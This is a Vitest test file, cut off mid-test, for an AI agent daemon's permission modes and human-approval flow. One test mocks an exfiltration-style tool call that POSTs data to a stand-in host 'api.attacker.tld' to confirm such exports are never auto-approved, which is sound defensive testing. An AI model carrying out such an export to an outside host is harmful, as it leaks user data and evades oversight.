import { describe, expect, it, vi, afterEach } from "vitest";
import { AgentDaemon } from "../daemon";
import { PermissionSettingsManager } from "../../security/permission-settings-manager";
import { MCPClientManager } from "../../mcp/client/MCPClientManager";
import { APPROVAL_REQUEST_TIMEOUT_MS } from "../approval-timeouts";

vi.mock("../../admin/policies", () => ({
  loadPolicies: vi.fn(() => ({
    runtime: {
      allowedPermissionModes: [],
      autoReview: { enabled: true },
      network: {
        defaultAction: "allow",
        allowedDomains: [],
        blockedDomains: [],
        allowShellNetwork: false,
      },
    },
  })),
}));

vi.mock("../../security/network-policy", () => ({
  evaluateNetworkPolicy: vi.fn(() => ({
    action: "allow",
    url: "https://docs.example.com/page",
    domain: "docs.example.com",
    toolName: "web_fetch",
    reason: "allowed",
    ruleSource: "admin_policy",
  })),
}));

import { evaluateNetworkPolicy } from "../../security/network-policy";

describe("AgentDaemon MCP startup recovery", () => {
  it("waits for the initial connected tool catalog before resuming a task", async () => {
    let finishDiscovery!: () => void;
    const discovery = new Promise<void>((resolve) => {
      finishDiscovery = resolve;
    });
    const initialize = vi
      .spyOn(MCPClientManager.getInstance(), "initialize")
      .mockReturnValue(discovery);
    const daemonLike = {
      resumeInterruptedTask: vi.fn().mockResolvedValue(undefined),
      failTask: vi.fn(),
      logEvent: vi.fn(),
    };
    try {
      const recovery = AgentDaemon.prototype["resumeInterruptedTasks"].call(daemonLike as Any, [
        { id: "mcp-recovery", title: "Find a decision" } as Any,
      ]);
      expect(initialize).toHaveBeenCalledOnce();
      expect(daemonLike.resumeInterruptedTask).not.toHaveBeenCalled();
      finishDiscovery();
      await recovery;
      expect(daemonLike.resumeInterruptedTask).toHaveBeenCalledOnce();
      expect(daemonLike.failTask).not.toHaveBeenCalled();
    } finally {
      initialize.mockRestore();
    }
  });
});

describe("AgentDaemon.requestApproval auto-approve controls", () => {
  afterEach(() => {
    vi.useRealTimers();
    vi.mocked(evaluateNetworkPolicy).mockReturnValue({
      action: "allow",
      url: "https://docs.example.com/page",
      domain: "docs.example.com",
      toolName: "web_fetch",
      reason: "allowed",
      ruleSource: "admin_policy",
    });
  });

  it("uses dont_ask as the default permission mode for automated tasks", () => {
    const daemonLike = {
      getExecutorForTask: vi.fn().mockReturnValue(null),
      logEvent: vi.fn(),
    } as Any;

    const mode = AgentDaemon.prototype["buildPermissionMode"].call(daemonLike, "task-auto", {
      id: "task-auto",
      source: "cron",
      status: "executing",
      agentConfig: {},
    });

    expect(mode).toBe("dont_ask");
  });

  it("keeps explicit task permission modes for automated tasks", () => {
    const daemonLike = {
      getExecutorForTask: vi.fn().mockReturnValue(null),
      logEvent: vi.fn(),
    } as Any;

    const mode = AgentDaemon.prototype["buildPermissionMode"].call(daemonLike, "task-auto", {
      id: "task-auto",
      source: "cron",
      status: "executing",
      agentConfig: { permissionMode: "default" },
    });

    expect(mode).toBe("default");
  });

  it("keeps runtime permission modes ahead of automated task defaults", () => {
    const daemonLike = {
      getExecutorForTask: vi.fn().mockReturnValue({
        runtime: {
          getPermissionState: vi.fn().mockReturnValue({ mode: "plan" }),
        },
      }),
      logEvent: vi.fn(),
    } as Any;

    const mode = AgentDaemon.prototype["buildPermissionMode"].call(daemonLike, "task-auto", {
      id: "task-auto",
      source: "cron",
      status: "executing",
      agentConfig: {},
    });

    expect(mode).toBe("plan");
  });

  it("keeps manual tasks on the configured default permission mode", () => {
    const loadSettings = vi.spyOn(PermissionSettingsManager, "loadSettings").mockReturnValue({
      version: 1,
      defaultMode: "default",
      defaultShellEnabled: false,
      defaultPermissionAccess: "default",
      rules: [],
    });
    const daemonLike = {
      getExecutorForTask: vi.fn().mockReturnValue(null),
      logEvent: vi.fn(),
    } as Any;

    const mode = AgentDaemon.prototype["buildPermissionMode"].call(daemonLike, "task-manual", {
      id: "task-manual",
      source: "manual",
      status: "executing",
      agentConfig: {},
    });

    expect(mode).toBe("default");
    expect(loadSettings).toHaveBeenCalled();
    loadSettings.mockRestore();
  });

  it("allows automation write_file permission checks without prompting", async () => {
    const workspace = {
      id: "workspace-1",
      name: "Workspace",
      path: "/Users/me/project",
      permissions: {
        read: true,
        write: true,
        delete: true,
        network: true,
        shell: true,
      },
      createdAt: Date.now(),
    };
    const daemonLike = Object.assign(Object.create(AgentDaemon.prototype), {
      taskRepo: {
        findById: vi.fn().mockReturnValue({
          id: "task-auto",
          workspaceId: workspace.id,
          source: "cron",
          status: "executing",
          agentConfig: {},
        }),
      },
      workspaceRepo: {
        findById: vi.fn().mockReturnValue(workspace),
      },
      workspacePermissionRuleRepo: {
        listByWorkspaceId: vi.fn().mockReturnValue([]),
      },
      getExecutorForTask: vi.fn().mockReturnValue(null),
      logEvent: vi.fn(),
    }) as Any;

    const result = await AgentDaemon.prototype.evaluateToolPermission.call(
      daemonLike,
      "task-auto",
      {
        approvalType: "external_service",
        toolName: "write_file",
        details: {
          path: "package.json",
          params: {
            path: "package.json",
          },
        },
      },
    );

    expect(result.decision).toBe("allow");
    expect(result.reason).toEqual(
      expect.objectContaining({
        type: "mode",
        mode: "dont_ask",
      }),
    );
  });

  it("evaluates task-level shell access against the effective workspace", async () => {
    const workspace = {
      id: "workspace-temp",
      name: "Temporary Workspace",
      path: "/tmp/workspace",
      permissions: {
        read: true,
        write: true,
        delete: true,
        network: true,
        shell: false,
      },
      createdAt: Date.now(),
    };
    const daemonLike = Object.assign(Object.create(AgentDaemon.prototype), {
      taskRepo: {
        findById: vi.fn().mockReturnValue({
          id: "task-shell-override",
          workspaceId: workspace.id,
          source: "manual",
          status: "executing",
          agentConfig: {
            shellAccess: true,
            permissionMode: "dont_ask",
          },
        }),
      },
      workspaceRepo: {
        findById: vi.fn().mockReturnValue(workspace),
      },
      workspacePermissionRuleRepo: {
        listByWorkspaceId: vi.fn().mockReturnValue([]),
      },
      getExecutorForTask: vi.fn().mockReturnValue(null),
      logEvent: vi.fn(),
    }) as Any;

    const result = await AgentDaemon.prototype.evaluateToolPermission.call(
      daemonLike,
      "task-shell-override",
      {
        approvalType: "run_command",
        toolName: "run_command",
        details: {
          command: "pwd",
          params: { command: "pwd" },
        },
      },
    );

    expect(result.decision).toBe("allow");
    expect(result.reason).not.toEqual(
      expect.objectContaining({
        type: "workspace_capability",
        capability: "shell",
      }),
    );
  });

  it("keeps session approve-all behavior for safe network reads", async () => {
    const approvalRepo = {
      create: vi.fn().mockReturnValue({ id: "approval-1" }),
      update: vi.fn().mockResolvedValue(true),
      resolvePending: vi.fn().mockResolvedValue(true),
    };
    const evaluatePermissionRequest = vi.fn().mockReturnValue({
      evaluation: {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for network read." },
      },
      promptDetails: {
        reason: { type: "mode", mode: "default", summary: "Prompt for network read." },
        scopePreview: "domain docs.example.com",
        suggestedActions: [],
      },
      scope: { kind: "domain", toolName: "web_fetch", domain: "docs.example.com" },
      trackingKey: "domain:web_fetch:docs.example.com",
      runtime: null,
      workspace: undefined,
    });

    const daemonLike = {
      sessionAutoApproveAll: true,
      approvalRepo,
      logEvent: vi.fn(),
      updateTask: vi.fn(),
      evaluatePermissionRequest,
      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
      canAutoReviewApprove: AgentDaemon.prototype["canAutoReviewApprove"],
      isAutoReviewSafeCommand: AgentDaemon.prototype["isAutoReviewSafeCommand"],
      taskRepo: {
        findById: vi.fn().mockReturnValue({ agentConfig: { autonomousMode: true } }),
      },
      pendingApprovals: new Map(),
    } as Any;

    const approved = await AgentDaemon.prototype.requestApproval.call(
      daemonLike,
      "task-1",
      "network_access",
      "Approve action",
      { tool: "web_fetch", params: { url: "https://docs.example.com/page" } },
    );

    expect(approved).toBe(true);
    expect(approvalRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        status: "pending",
      }),
    );
    expect(evaluatePermissionRequest).toHaveBeenCalled();
    expect(evaluateNetworkPolicy).toHaveBeenCalledWith({
      url: "https://docs.example.com/page",
      toolName: "web_fetch",
    });
  });

  it.each([
    ["an ordinary request", false, true],
    ["a PACT business operation (noStandingApproval)", true, false],
  ])(
    "applies a matching recurring allow only to %s",
    async (_label, noStandingApproval, usesRecurring) => {
      const previousNodeEnv = process.env.NODE_ENV;
      const previousPromptMode = process.env.COWORK_APPROVAL_PROMPTS;
      const previousVitest = process.env.VITEST;
      const previousHeadless = process.env.COWORK_HEADLESS;
      process.env.NODE_ENV = "production";
      delete process.env.COWORK_APPROVAL_PROMPTS;
      delete process.env.VITEST;
      // A headless run cannot answer inline, which would skip the path under test.
      delete process.env.COWORK_HEADLESS;

      const workspace = { id: "ws-1", path: "/tmp/ws-1", permissions: { network: true } };
      const recurringApprovalService = {
        findActive: vi.fn().mockResolvedValue({ summary: { id: "recurring-1", effect: "allow" } }),
      };
      const approvalRepo = {
        create: vi.fn((row: Any) => ({ id: "inline-request", ...row })),
        approvedRevisionCurrent: vi.fn().mockResolvedValue(true),
        update: vi.fn().mockResolvedValue(true),
        resolvePending: vi.fn().mockResolvedValue(true),
      };
      const daemonLike = {
        options: { recurringApprovalService },
        sessionAutoApproveAll: false,
        approvalRepo,
        // The user answers Deny: only a recurring approval could make this request pass.
        requestAssistantApproval: vi.fn(async (...args: Any[]) =>
          args[7] ? args[7](false) : false,
        ),
        buildRecurringApprovalInput: vi.fn().mockReturnValue({ kind: "external_service" }),
        logEvent: vi.fn(),
        updateTask: vi.fn(),
        evaluatePermissionRequest: vi.fn().mockReturnValue({
          evaluation: {
            decision: "ask",
            reason: { type: "mode", mode: "default", summary: "Prompt for business message." },
          },
          promptDetails: {
            reason: { type: "mode", mode: "default", summary: "Prompt for business message." },
            scopePreview: "pact_send_message on domain agent.example.com",
            suggestedActions: [],
          },
          scope: { kind: "domain", toolName: "pact_send_message", domain: "agent.example.com" },
          trackingKey: "domain:pact_send_message:agent.example.com",
          runtime: null,
          workspace,
        }),
        taskRepo: {
          findById: vi
            .fn()
            .mockReturnValue({ agentConfig: { accessProfileId: "ask_for_approval" } }),
        },
        pendingApprovals: new Map(),
      } as Any;

      try {
        const approved = await AgentDaemon.prototype.requestApproval.call(
          daemonLike,
          "task-pact",
          "external_service",
          "Send a change to Example Co.",
          { tool: "pact_send_message", params: { message: "Cancel order A-1." } },
          {
            requireExplicitApproval: noStandingApproval,
            allowAutoApprove: !noStandingApproval,
            noStandingApproval,
          },
        );

        expect(approved).toBe(usesRecurring);
        if (usesRecurring) {
          expect(recurringApprovalService.findActive).toHaveBeenCalledOnce();
          expect(daemonLike.requestAssistantApproval).not.toHaveBeenCalled();
          expect(daemonLike.logEvent).toHaveBeenCalledWith(
            "task-pact",
            "log",
            expect.objectContaining({ reason: "recurring_approval" }),
          );
        } else {
          expect(recurringApprovalService.findActive).not.toHaveBeenCalled();
          expect(daemonLike.requestAssistantApproval).toHaveBeenCalledOnce();
        }
      } finally {
        if (previousNodeEnv === undefined) delete process.env.NODE_ENV;
        else process.env.NODE_ENV = previousNodeEnv;
        if (previousPromptMode === undefined) delete process.env.COWORK_APPROVAL_PROMPTS;
        else process.env.COWORK_APPROVAL_PROMPTS = previousPromptMode;
        if (previousVitest === undefined) delete process.env.VITEST;
        else process.env.VITEST = previousVitest;
        if (previousHeadless === undefined) delete process.env.COWORK_HEADLESS;
        else process.env.COWORK_HEADLESS = previousHeadless;
      }
    },
  );

  it("routes ordinary approval decisions to assistant input with a canonical request", async () => {
    const previousNodeEnv = process.env.NODE_ENV;
    const previousPromptMode = process.env.COWORK_APPROVAL_PROMPTS;
    const previousVitest = process.env.VITEST;
    process.env.NODE_ENV = "production";
    delete process.env.COWORK_APPROVAL_PROMPTS;
    delete process.env.VITEST;

    const approvalRepo = {
      create: vi.fn((row: Any) => ({ id: "inline-request", ...row })),
      approvedRevisionCurrent: vi.fn().mockResolvedValue(true),
      update: vi.fn().mockResolvedValue(true),
      resolvePending: vi.fn().mockResolvedValue(true),
    };
    const evaluatePermissionRequest = vi.fn().mockReturnValue({
      evaluation: {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for network read." },
      },
      promptDetails: {
        reason: { type: "mode", mode: "default", summary: "Prompt for network read." },
        scopePreview: "domain docs.example.com",
        suggestedActions: [],
      },
      scope: { kind: "domain", toolName: "web_fetch", domain: "docs.example.com" },
      trackingKey: "domain:web_fetch:docs.example.com",
      runtime: null,
      workspace: undefined,
    });
    const daemonLike = {
      sessionAutoApproveAll: false,
      approvalRepo,
      requestAssistantApproval: vi.fn(async (...args: Any[]) => (args[7] ? args[7](true) : true)),
      logEvent: vi.fn(),
      updateTask: vi.fn(),
      evaluatePermissionRequest,
      taskRepo: {
        findById: vi.fn().mockReturnValue({ agentConfig: { accessProfileId: "ask_for_approval" } }),
      },
      pendingApprovals: new Map(),
    } as Any;

    try {
      const approved = await AgentDaemon.prototype.requestApproval.call(
        daemonLike,
        "task-no-prompt",
        "network_access",
        "Approve action",
        { tool: "web_fetch", params: { url: "https://docs.example.com/page" } },
      );

      expect(approved).toBe(true);
      expect(approvalRepo.create).toHaveBeenCalledOnce();
      expect(daemonLike.requestAssistantApproval).toHaveBeenCalledWith(
        "task-no-prompt",
        "network_access",
        "Approve action",
        expect.objectContaining({ tool: "web_fetch" }),
        null,
        "domain:web_fetch:docs.example.com",
        undefined,
        expect.any(Function),
        expect.objectContaining({
          approvalId: "inline-request",
          revisionHash: expect.stringMatching(/^[a-f0-9]{64}$/),
        }),
      );
    } finally {
      if (previousNodeEnv === undefined) delete process.env.NODE_ENV;
      else process.env.NODE_ENV = previousNodeEnv;
      if (previousPromptMode === undefined) delete process.env.COWORK_APPROVAL_PROMPTS;
      else process.env.COWORK_APPROVAL_PROMPTS = previousPromptMode;
      if (previousVitest === undefined) delete process.env.VITEST;
      else process.env.VITEST = previousVitest;
    }
  });

  it.each([
    ["unchanged", "key-original", true],
    ["changed while the card was open", "key-after-profile-change", false],
  ])(
    "revalidates an inline Allow once answer when authority is %s",
    async (_label, currentKey, expected) => {
      const previousNodeEnv = process.env.NODE_ENV;
      const previousPromptMode = process.env.COWORK_APPROVAL_PROMPTS;
      const previousVitest = process.env.VITEST;
      process.env.NODE_ENV = "production";
      delete process.env.COWORK_APPROVAL_PROMPTS;
      delete process.env.VITEST;

      const ask = {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for network read." },
      };
      const evaluatePermissionRequest = vi
        .fn()
        .mockReturnValueOnce({
          evaluation: ask,
          promptDetails: { reason: ask.reason, scopePreview: "domain docs.example.com" },
          scope: { kind: "domain", toolName: "web_fetch", domain: "docs.example.com" },
          trackingKey: "domain:web_fetch:docs.example.com",
          runtime: null,
          workspace: undefined,
          authorizationKey: "key-original",
        })
        .mockReturnValue({
          evaluation: ask,
          workspace: { permissions: { accessApprovalPolicy: "on-request" } },
          authorizationKey: currentKey,
        });
      const daemonLike = {
        sessionAutoApproveAll: false,
        approvalRepo: {
          create: vi.fn((row: Any) => ({ id: "inline-request", ...row })),
          resolvePending: vi.fn().mockResolvedValue(true),
          approvedRevisionCurrent: vi.fn().mockResolvedValue(true),
          update: vi.fn(),
        },
        requestAssistantApproval: vi.fn(async (...args: Any[]) => (args[7] ? args[7](true) : true)),
        isApprovalAuthorityCurrent: AgentDaemon.prototype["isApprovalAuthorityCurrent"],
        logEvent: vi.fn(),
        updateTask: vi.fn(),
        evaluatePermissionRequest,
        taskRepo: {
          findById: vi.fn().mockReturnValue({
            id: "task-card",
            status: "executing",
            agentConfig: { accessProfileId: "ask_for_approval" },
          }),
        },
        pendingApprovals: new Map(),
      } as Any;

      try {
        const approved = await AgentDaemon.prototype.requestApproval.call(
          daemonLike,
          "task-card",
          "network_access",
          "Approve action",
          { tool: "web_fetch", params: { url: "https://docs.example.com/page" } },
        );

        expect(approved).toBe(expected);
        expect(daemonLike.requestAssistantApproval).toHaveBeenCalledTimes(1);
        expect(evaluatePermissionRequest).toHaveBeenCalledTimes(expected ? 3 : 2);
        expect(
          daemonLike.logEvent.mock.calls.some(
            (call: Any[]) =>
              call[1] === "approval_denied" && call[2]?.reason === "approval_authority_changed",
          ),
        ).toBe(!expected);
      } finally {
        if (previousNodeEnv === undefined) delete process.env.NODE_ENV;
        else process.env.NODE_ENV = previousNodeEnv;
        if (previousPromptMode === undefined) delete process.env.COWORK_APPROVAL_PROMPTS;
        else process.env.COWORK_APPROVAL_PROMPTS = previousPromptMode;
        if (previousVitest === undefined) delete process.env.VITEST;
        else process.env.VITEST = previousVitest;
      }
    },
  );

  it("does not session auto-approve network reads denied by network policy", async () => {
    vi.useFakeTimers();
    vi.mocked(evaluateNetworkPolicy).mockReturnValueOnce({
      action: "deny",
      url: "https://blocked.example/page",
      domain: "blocked.example",
      toolName: "web_fetch",
      reason: "blocked_domain",
      ruleSource: "admin_policy",
    });

    const approvalRepo = {
      create: vi.fn().mockReturnValue({ id: "approval-denied-net" }),
      update: vi.fn().mockResolvedValue(true),
      resolvePending: vi.fn().mockResolvedValue(true),
    };
    const evaluatePermissionRequest = vi.fn().mockReturnValue({
      evaluation: {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for network read." },
      },
      promptDetails: {
        reason: { type: "mode", mode: "default", summary: "Prompt for network read." },
        scopePreview: "domain blocked.example",
        suggestedActions: [],
      },
      scope: { kind: "domain", toolName: "web_fetch", domain: "blocked.example" },
      trackingKey: "domain:web_fetch:blocked.example",
      runtime: null,
      workspace: undefined,
    });

    const daemonLike = {
      sessionAutoApproveAll: true,
      approvalRepo,
      logEvent: vi.fn(),
      updateTask: vi.fn(),
      evaluatePermissionRequest,
      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
      canAutoReviewApprove: AgentDaemon.prototype["canAutoReviewApprove"],
      isAutoReviewSafeCommand: AgentDaemon.prototype["isAutoReviewSafeCommand"],
      taskRepo: {
        findById: vi.fn().mockReturnValue({ agentConfig: { autonomousMode: true } }),
      },
      pendingApprovals: new Map(),
    } as Any;

    const approvalPromise = AgentDaemon.prototype.requestApproval.call(
      daemonLike,
      "task-denied-net",
      "network_access",
      "Approve action",
      { tool: "web_fetch", params: { url: "https://blocked.example/page" } },
    );
    // Permission evaluation reads storage before the approval row is created (DB6).
    for (let turn = 0; turn < 10; turn += 1) await Promise.resolve();

    expect(approvalRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        status: "pending",
      }),
    );
    expect(daemonLike.pendingApprovals.size).toBe(1);

    const pending = daemonLike.pendingApprovals.get("approval-denied-net");
    clearTimeout(pending.timeoutHandle);
    pending.resolve(false);

    await expect(approvalPromise).resolves.toBe(false);
  });

  it("does not treat project test commands as auto-review safe shell commands", () => {
    expect(AgentDaemon.prototype["isAutoReviewSafeCommand"].call({} as Any, "npm test")).toBe(
      false,
    );
    expect(AgentDaemon.prototype["isAutoReviewSafeCommand"].call({} as Any, "pytest")).toBe(false);
    expect(AgentDaemon.prototype["isAutoReviewSafeCommand"].call({} as Any, "git status")).toBe(
      true,
    );
  });

  it("disables auto-approve when allowAutoApprove=false is passed", async () => {
    vi.useFakeTimers();

    const approvalRepo = {
      create: vi.fn().mockReturnValue({ id: "approval-2" }),
      update: vi.fn().mockResolvedValue(true),
      resolvePending: vi.fn().mockResolvedValue(true),
    };
    const evaluatePermissionRequest = vi.fn().mockReturnValue({
      evaluation: {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for this action." },
      },
      promptDetails: {
        reason: { type: "mode", mode: "default", summary: "Prompt for this action." },
        scopePreview: "tool x402_fetch",
        suggestedActions: [],
      },
      scope: { kind: "tool", toolName: "x402_fetch" },
      trackingKey: "tool x402_fetch",
      runtime: null,
      workspace: undefined,
    });

    const daemonLike = {
      sessionAutoApproveAll: true,
      approvalRepo,
      logEvent: vi.fn(),
      updateTask: vi.fn(),
      evaluatePermissionRequest,
      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
      canAutoReviewApprove: AgentDaemon.prototype["canAutoReviewApprove"],
      isAutoReviewSafeCommand: AgentDaemon.prototype["isAutoReviewSafeCommand"],
      taskRepo: {
        findById: vi.fn().mockReturnValue({ agentConfig: { autonomousMode: true } }),
      },
      pendingApprovals: new Map(),
    } as Any;

    const approvalPromise = AgentDaemon.prototype.requestApproval.call(
      daemonLike,
      "task-2",
      "external_service",
      "Approve payment",
      { tool: "x402_fetch" },
      { allowAutoApprove: false },
    );
    // Permission evaluation reads storage before the approval row is created (DB6).
    for (let turn = 0; turn < 10; turn += 1) await Promise.resolve();

    expect(approvalRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        status: "pending",
      }),
    );
    expect(daemonLike.pendingApprovals.size).toBe(1);

    const pending = daemonLike.pendingApprovals.get("approval-2");
    clearTimeout(pending.timeoutHandle);
    pending.resolve(true);

    await expect(approvalPromise).resolves.toBe(true);
  });

  it("scopes task auto-approve to explicitly allowed approval types", async () => {
    vi.useFakeTimers();

    const approvalRepo = {
      create: vi.fn().mockReturnValue({ id: "approval-3" }),
      update: vi.fn().mockResolvedValue(true),
      resolvePending: vi.fn().mockResolvedValue(true),
    };
    const evaluatePermissionRequest = vi.fn().mockReturnValue({
      evaluation: {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for this action." },
      },
      promptDetails: {
        reason: { type: "mode", mode: "default", summary: "Prompt for this action." },
        scopePreview: "tool x402_fetch",
        suggestedActions: [],
      },
      scope: { kind: "tool", toolName: "x402_fetch" },
      trackingKey: "tool x402_fetch",
      runtime: null,
      workspace: undefined,
    });

    const daemonLike = {
      sessionAutoApproveAll: false,
      approvalRepo,
      logEvent: vi.fn(),
      updateTask: vi.fn(),
      evaluatePermissionRequest,
      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
      canAutoReviewApprove: AgentDaemon.prototype["canAutoReviewApprove"],
      isAutoReviewSafeCommand: AgentDaemon.prototype["isAutoReviewSafeCommand"],
      taskRepo: {
        findById: vi.fn().mockReturnValue({
          agentConfig: {
            autonomousMode: true,
            autoApproveTypes: ["run_command"],
          },
        }),
      },
      pendingApprovals: new Map(),
    } as Any;

    const approvalPromise = AgentDaemon.prototype.requestApproval.call(
      daemonLike,
      "task-3",
      "external_service",
      "Approve external side effect",
      { tool: "x402_fetch" },
    );
    // Permission evaluation reads storage before the approval row is created (DB6).
    for (let turn = 0; turn < 10; turn += 1) await Promise.resolve();

    expect(approvalRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        status: "pending",
        type: "external_service",
      }),
    );
    expect(daemonLike.pendingApprovals.size).toBe(1);

    const pending = daemonLike.pendingApprovals.get("approval-3");
    clearTimeout(pending.timeoutHandle);
    pending.resolve(false);

    await expect(approvalPromise).resolves.toBe(false);
  });

  it("does not session auto-approve data exports even when approve-all is enabled", async () => {
    vi.useFakeTimers();

    const approvalRepo = {
      create: vi.fn().mockReturnValue({ id: "approval-export" }),
      update: vi.fn().mockResolvedValue(true),
      resolvePending: vi.fn().mockResolvedValue(true),
    };
    const evaluatePermissionRequest = vi.fn().mockReturnValue({
      evaluation: {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for export." },
      },
      promptDetails: {
        reason: { type: "mode", mode: "default", summary: "Prompt for export." },
        scopePreview: "domain api.attacker.tld",
        suggestedActions: [],
      },
      scope: { kind: "domain", toolName: "http_request", domain: "api.attacker.tld" },
      trackingKey: "domain:http_request:api.attacker.tld",
      runtime: null,
      workspace: undefined,
    });

    const daemonLike = {
      sessionAutoApproveAll: true,
      approvalRepo,
      logEvent: vi.fn(),
      updateTask: vi.fn(),
      evaluatePermissionRequest,
      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
      canAutoReviewApprove: AgentDaemon.prototype["canAutoReviewApprove"],
      isAutoReviewSafeCommand: AgentDaemon.prototype["isAutoReviewSafeCommand"],
      taskRepo: {
        findById: vi.fn().mockReturnValue({ agentConfig: { autonomousMode: true } }),
      },
      pendingApprovals: new Map(),
    } as Any;

    void AgentDaemon.prototype.requestApproval.call(
      daemonLike,
      "task-export",
      "data_export",
      "Approve export",
      {
        tool: "http_request",
        params: { url: "https://api.attacker.tld", method: "POST", body: "x" },
      },
    );
    for (let turn = 0; turn < 10; turn += 1) await Promise.resolve();

    expect(approvalRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        status: "pending",
        type: "data_export",
      }),
    );
    expect(daemonLike.pendingApprovals.size).toBe(1);
  });

  it("does not session auto-approve computer_use even when session auto-approve is enabled", async () => {
    vi.useFakeTimers();

    const approvalRepo = {
      create: vi.fn().mockReturnValue({ id: "approval-cu" }),
      update: vi.fn().mockResolvedValue(true),
      resolvePending: vi.fn().mockResolvedValue(true),
    };
    const evaluatePermissionRequest = vi.fn().mockReturnValue({
      evaluation: {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for this action." },
      },
      promptDetails: {
        reason: { type: "mode", mode: "default", summary: "Prompt for this action." },
        scopePreview: "tool computer_use",
        suggestedActions: [],
      },
      scope: { kind: "tool", toolName: "computer_use" },
      trackingKey: "tool computer_use",
      runtime: null,
      workspace: undefined,
    });

    const daemonLike = {
      sessionAutoApproveAll: true,
      approvalRepo,
      logEvent: vi.fn(),
      updateTask: vi.fn(),
      evaluatePermissionRequest,
      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
      canAutoReviewApprove: AgentDaemon.prototype["canAutoReviewApprove"],
      isAutoReviewSafeCommand: AgentDaemon.prototype["isAutoReviewSafeCommand"],
      taskRepo: {
        findById: vi.fn().mockReturnValue({ agentConfig: { autonomousMode: true } }),
      },
      pendingApprovals: new Map(),
    } as Any;

    void AgentDaemon.prototype.requestApproval.call(
      daemonLike,
      "task-cu",
      "computer_use",
      "Allow app for session",
      { kind: "computer_use_app_grant", appName: "Safari" },
      { allowAutoApprove: false },
    );
    for (let turn = 0; turn < 10; turn += 1) await Promise.resolve();

    expect(approvalRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        status: "pending",
        type: "computer_use",
      }),
    );
    expect(daemonLike.pendingApprovals.size).toBe(1);
  });

  it("does not overwrite terminal task state when an approval times out late", async () => {
    vi.useFakeTimers();

    const approvalRepo = {
      create: vi.fn().mockReturnValue({ id: "approval-timeout" }),
      update: vi.fn().mockResolvedValue(true),
      resolvePending: vi.fn().mockResolvedValue(true),
    };
    const evaluatePermissionRequest = vi.fn().mockReturnValue({
      evaluation: {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for this action." },
      },
      promptDetails: {
        reason: { type: "mode", mode: "default", summary: "Prompt for this action." },
        scopePreview: "tool x402_fetch",
        suggestedActions: [],
      },
      scope: { kind: "tool", toolName: "x402_fetch" },
      trackingKey: "tool x402_fetch",
      runtime: null,
      workspace: undefined,
    });
    const updateTask = vi.fn();
    const logEvent = vi.fn();

    const daemonLike = {
      sessionAutoApproveAll: false,
      approvalRepo,
      logEvent,
      updateTask,
      evaluatePermissionRequest,
      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
      canAutoReviewApprove: AgentDaemon.prototype["canAutoReviewApprove"],
      isAutoReviewSafeCommand: AgentDaemon.prototype["isAutoReviewSafeCommand"],
      taskRepo: {
        findById: vi.fn().mockReturnValue({
          id: "task-timeout",
          status: "completed",
          completedAt: Date.now(),
          terminalStatus: "ok",
        }),
      },
      pendingApprovals: new Map(),
    } as Any;

    const approvalPromise = AgentDaemon.prototype.requestApproval.call(
      daemonLike,
      "task-timeout",
      "external_service",
      "Approve action",
      { tool: "x402_fetch" },
    );
    // Permission evaluation reads storage before the approval row is created (DB6).
    for (let turn = 0; turn < 10; turn += 1) await Promise.resolve();

    expect(updateTask).toHaveBeenCalledWith(
      "task-timeout",
      expect.objectContaining({
        status: "blocked",
        terminalStatus: "awaiting_approval",
      }),
    );

    const rejection = expect(approvalPromise).rejects.toThrow(
      "Approval request timed out after task completion",
    );
    await vi.advanceTimersByTimeAsync(5 * 60 * 1000);

    await rejection;
    expect(approvalRepo.update).toHaveBeenCalledWith("approval-timeout", "denied");
    expect(updateTask).not.toHaveBeenCalledWith(
      "task-timeout",
      expect.objectContaining({
        status: "paused",
        terminalStatus: "needs_user_action",
        error: "Approval request timed out",
      }),
    );
    expect(logEvent).not.toHaveBeenCalledWith(
      "task-timeout",
      "approval_denied",
      expect.objectContaining({
        approvalId: "approval-timeout",
        reason: "timeout",
      }),
    );
    expect(daemonLike.pendingApprovals.size).toBe(0);
  });

  it("invalidates a pending approval when the tool execution is aborted", async () => {
    const approvalRepo = {
      create: vi.fn().mockReturnValue({ id: "approval-aborted-tool" }),
      update: vi.fn().mockResolvedValue(true),
      resolvePending: vi.fn().mockResolvedValue(true),
    };
    const evaluatePermissionRequest = vi.fn().mockReturnValue({
      evaluation: {
        decision: "ask",
        reason: { type: "mode", mode: "default", summary: "Prompt for this write." },
      },
      promptDetails: {
        reason: { type: "mode", mode: "default", summary: "Prompt for this write." },
        scopePreview: "write_file on path notes.md",
        suggestedActions: [],
      },
      scope: { kind: "path", path: "notes.md", toolName: "write_file" },
      trackingKey: "path:write_file:notes.md",
      runtime: null,
      workspace: undefined,
    });
    const logEvent = vi.fn();
    const controller = new AbortController();
    const task = { id: "task-aborted-tool", agentConfig: {} };
    const daemonLike = {
      sessionAutoApproveAll: false,
      approvalRepo,
      logEvent,
      updateTask: vi.fn(),
      evaluatePermissionRequest,
      getTaskWithTransientAgentConfig: vi.fn((value) => value),
      getEffectiveAccessProfile: vi.fn().mockReturnValue({
        id: "ask",
        requestedId: "ask",
        sandboxMode: "workspace-write",
        definition: {
          approval: "ask",
          reviewer: "manual",
          network: "on-request",
          domainRules: [],
        },
        adminConstrained: false,
        profileUnavailable: false,
        profileScoped: true,
      }),
